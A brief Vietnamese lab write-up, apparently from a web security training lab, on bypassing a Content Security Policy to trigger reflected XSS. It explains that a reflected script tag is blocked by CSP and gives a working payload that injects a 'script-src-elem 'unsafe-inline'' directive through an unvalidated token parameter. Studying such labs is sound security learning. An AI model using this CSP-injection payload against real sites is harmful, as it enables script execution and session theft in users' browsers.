## Reflected XSS protected by CSP, with CSP bypass(REFER)

1. Search `<script>alert(1)</script` thì thấy payload được reflect y nguyên nhưng không được thực thi do lab sử dụng CSP

2. Tham số token không có giá trị. Bypass thông qua param token bằng cách inject `script-src-elem` directive ghi đè lên `script-src` với giá trị `unsafe-inline` cho phép sử dụng inline script element 

![Img1](\asset/../img/detect.png)

- Payload: ``<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'``